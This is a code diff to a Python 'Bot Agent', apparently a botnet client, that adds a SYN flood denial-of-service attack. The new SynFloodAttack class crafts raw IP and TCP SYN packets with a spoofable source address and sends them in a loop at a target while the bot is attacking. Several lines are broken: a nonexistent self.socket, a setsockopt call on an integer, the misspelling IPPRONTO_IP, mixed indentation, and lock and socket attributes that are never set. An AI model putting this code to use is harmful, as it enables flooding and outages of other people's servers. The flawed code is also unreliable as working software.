@@ -6,6 +6,7 @@ import argparse
 import threading
 import select
 from random import *
+import time
 
 RECV_BUFFER = 4096
 ENCODING = 'utf-8'
@@ -117,7 +118,10 @@ class Bot():
 			attack.run()
 
 		
-	#def attack2(self, host, port):
+	def attack2(self, host, port):
+                attack2 = SynFloodAttack(self.target_address, self.ip)
+                while self.attacking == True:
+                        attack2.run()
 		#spoof source IP? fake_ip()p
 
 		#do attack on host:port
@@ -192,9 +196,109 @@ class RequestAttack():
 			print(e)
 			sys.exit()
 			
-''' End of referenced code'''
 
-			
+class SynFloodAttack():
+	def __init__(self,target,ip):
+		Thread.__init__(self)
+		self.target = target
+		self.ip = ip
+		self.psh = ''
+		
+	def checksum(self):
+		s = 0
+
+		# loop through 2 characters at a time
+		for i in range(0,len(self.psh),2):
+			w = ((self.psh[i]) << 8) + ((self.psh[i+1]))
+			s = s + w
+
+		s = (s>>16) + (s & 0xffff)
+
+		# compliment and mask to 4 byte short
+		s = ~s & 0xffff
+
+		return s
+	    
+	def Building_packet(self):
+                #ip header fields
+		ihl = 5
+		version = 4
+		tos = 0
+		tot = 40
+		id = 54321  #id of this packet
+		frag_off = 0
+		ttl = 64 #255
+		protocol = IPPROTO_TCP  #socket
+		check = 10
+		s_addr = inet_aton(self.ip) #socket -- this can be spoofed
+		d_addr= inet_aton(self.target) #socket
+
+		ihl_version = (version << 4) + ihl
+                #the ! in the pack format string means network order
+		ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
+
+                #tcp header fields
+		source = 54321 #source port -- 1234
+		dest = 80      #destination port
+		seq = 0
+		ack_seq = 0
+		doff = 5       #4 bit field, size of tcp header, 5 * 4 = 20 bytes
+                #tcp flags
+		fin = 0
+		syn = 1
+		rst = 0
+		ack = 0
+		psh = 0
+		urg = 0
+		window = htons(5840)  #socket -- maximum allowed window size
+		check = 0
+		urg_prt = 0
+
+		offset_res = (doff << 4)
+		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
+
+                # the ! in the pack format string means network order
+		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
+
+                #pseudo header fields
+		src_addr = inet_aton(self.ip) #socket
+		dst_addr = inet_aton(self.target) #socket
+		placeholder = 0
+		protocol = IPPROTO_TCP #socket
+		tcp_length = len(tcp_header)
+
+		self.psh = pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol,tcp_length);
+		self.psh = self.psh + tcp_header;
+
+		tcp_checksum = self.checksum()
+
+                # make the tcp header again and fill in the correct checksum
+		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_prt)
+
+                #final full packet - syn packets do not have any data
+		packet = ip_header + tcp_header
+
+		return packet
+
+	def run(self):
+                sock = self.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+                sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                #tell kernel not to put in headers since we are providing it
+                self.checksum().setsockopt(socket.IPPRONTO_IP, socket.IP_HDRINCL, 1)
+		packet=self.Building_packet()
+		try:
+			self.lock.acquire()
+			self.sock.sendto(packet,(self.target,0))
+		except KeyboardInterrupt:
+			sys.exit(print('Canceled by user'))
+		except Exception as e:
+			print(e)
+		finally:
+			self.lock.release()
+			sys.exit()
+      
+''' end of referenced code '''
+
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description = 'Bot Agent')
 	parser.add_argument('-a', metavar='HOST_ADDRESS', type=str,
